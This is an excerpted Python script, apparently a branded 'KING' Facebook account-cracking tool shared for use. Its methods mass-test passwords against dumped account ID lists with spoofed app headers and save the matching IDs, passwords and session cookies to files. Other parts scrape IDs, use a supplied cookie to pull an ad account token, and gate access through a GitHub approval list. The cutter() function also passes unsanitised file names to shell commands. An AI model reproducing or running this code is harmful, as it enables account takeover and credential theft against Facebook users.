...
from concurrent.futures import ThreadPoolExecutor as sarfrazKING
...
model2 = requests.get('https://gist.githubusercontent.com/SAQIB567/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
...
sys.stdout.write('\x1b]2; KING\x07')
...
head = {'Host': 'SAQIB.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
...
\033[1;37m Owner   :            KING SAQI

\033[1;37m Facebook:          KING SAQI

\033[1;37m Github  :            SAQIB567

\033[1;37m Version :            01.0
...
def result(OKs,cps):
    ...
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back KING Menu ")
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/03458232598')

        pass

    elif select =='F':

        os.system('xdg-open https://facebook.com/groups/03458232598/')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}[KING] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [-OK] {sid} | {ps} {S}")

                    oks.append(sid)

                    open('/sdcard/KING_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/KING_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')

                    break

                elif 'www.facebook.com' in q['error']['message']:

                     #print(f"\r{A} [KING-CP] {sid} | {ps} {S}")
    ...
    def methodC(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}[KING] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [KING-OK] {sid} | {ps} {S}")

                    oks.append(sid)

                    open('/sdcard/KING_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/KING_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
    ...
    def methodB(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}[KING] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        ...
        sys.stdout.write(f"\r {S}[KING] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
    ...
    def pasw(self):       
            ...
            with sarfrazKING(max_workers=30) as KINGworld:
...
def login():
    ...
    try:
        ...
        fact = requests.get("https://MAHARSAQIB.facebook.com/SAQIB/", cookies = {"cookie":fbcokis},headers=head).text

        act = re.search("act=(.*?)&nav_source",str(fact)).group(1)

        ftoken = requests.get(f"https://.facebook.com/SAQIB/manage/campaigns?act={act}&nav_source=no_referrer", cookies = {"cookie":fbcokis}).text
...
def public():
    ...
    try:
        ...
        print(f'File Name To Dump Ids. Example /sdcard/KING.txt') 
...
def sids():
    ...
    print('\033[1;37mExample: /sdcard/KING.txt\033[0;97m')
...
def cutter():
    ...
    os.system('sort -r '+KING+' | uniq > '+sarfraz)

    os.system('clear')

    print(logo)

    print("Removed Successful From File : " + KING )
    ...
    input(f"{S} Press Enter To Back KING Menu ")
...
def p_dump():
    ...
    try:
        ...
        print(f'{S}File Name To Dump Ids. Example /sdcard/KING.txt\n') 
...
def approval():
  ...
  try:
    ...
    httpCaht = requests.get('https://github.com/SAQIB567/naib.txt/blob/main/naib.txt').text
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+92333 5496239?text='+tks),approval()
